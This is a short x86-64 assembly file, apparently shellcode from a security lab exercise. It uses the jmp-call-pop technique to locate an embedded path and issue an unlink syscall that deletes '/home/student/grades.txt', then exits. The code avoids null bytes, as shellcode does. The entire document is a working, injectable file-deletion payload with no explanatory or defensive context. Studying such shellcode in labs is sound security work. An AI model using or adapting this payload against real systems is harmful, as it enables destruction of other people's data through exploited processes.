#include <sys/syscall.h>
#define PATH "/home/student/grades.txt"

.globl main
	.type	main, @function

main:
	jmp	m1

 m2:
	popq	%rcx
	xorq	%rax,%rax
	movb    $SYS_unlink,%al
	movq	%rcx,%rdi
	syscall	

	xorq	%rax,%rax		
	movb    $SYS_exit,%al		
	xorq	%rdi,%rdi		
	syscall		
	
m1:
	call	m2
	.ascii	PATH